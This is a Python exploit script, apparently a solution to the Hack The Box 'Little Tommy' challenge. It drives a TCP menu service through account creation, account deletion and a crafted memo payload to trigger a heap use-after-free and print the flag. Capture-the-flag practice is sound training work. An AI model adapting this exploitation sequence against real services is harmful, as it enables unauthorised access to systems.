#!/usr/bin/env python3

import socket
import sys
import ipaddress

def check_ip(ip_address):
    try:
        ip = ipaddress.ip_address(ip_address)
        # To get the ip value instead of the object
        return(ip.__str__())
    except ValueError:
        # If ValueError exception is raised, value for ip is invalid
        return(False)

def check_port(port):
    if (type(port) == int) and (port > 0 and port < 65536):
        return(port)
    else:
        return(False)
        
def send_ascii_data(socket, data):
    return(socket.send(data.encode("ascii")))
    
def recv_data_utf8(socket):
    return(socket.recv(1024).decode("utf-8"))

def main(argv):
    if len(argv) < 3:
        print("Hack The Box Little Tommy Exploit")
        print("Usage: ./{} host port".format(str(argv[0])))
        return(False)

    exploit = "RATFBBBBCCCCDDDDFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQLAMESSSSTTTUUUUVVVVXXXXZZZZABABACACADADAFAFAGAGAHAHRATF\n"
    ip_address = check_ip(argv[1])
    port = check_port(int(argv[2]))
    
    if ip_address == False:
        print("IP for host {} is invalid!".format(argv[1]))
        return(False)
        
    if port == False:
        print("Port {} is invalid!".format(argv[2]))
        return(False)
        
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        my_socket.connect((ip_address, port))
    except ConnectionRefusedError:
        print("Can't connect to the server!")
        return(False)
        
    print(recv_data_utf8(my_socket))
    send_ascii_data(my_socket, "1\n") # Create account
    print(recv_data_utf8(my_socket))
    send_ascii_data(my_socket, "5cr197\n") # Name
    print(recv_data_utf8(my_socket))
    send_ascii_data(my_socket, "K1dd13!\n") # Last Name
    print(recv_data_utf8(my_socket))
    send_ascii_data(my_socket, "3\n") # Delete account
    print(recv_data_utf8(my_socket))
    send_ascii_data(my_socket, "4\n") # Create a memo
    print(recv_data_utf8(my_socket))
    send_ascii_data(my_socket, exploit) # Write the memo
    print(recv_data_utf8(my_socket))
    print(recv_data_utf8(my_socket))
    send_ascii_data(my_socket, "5\n") # Display flag
    print(recv_data_utf8(my_socket))
    print(recv_data_utf8(my_socket))
    
    my_socket.shutdown(socket.SHUT_RDWR)
    my_socket.close()
        
          
if __name__ == '__main__':
    main(sys.argv)
    

# No free flags for you here sir!
# Look it up for heap memory and use-after-free!
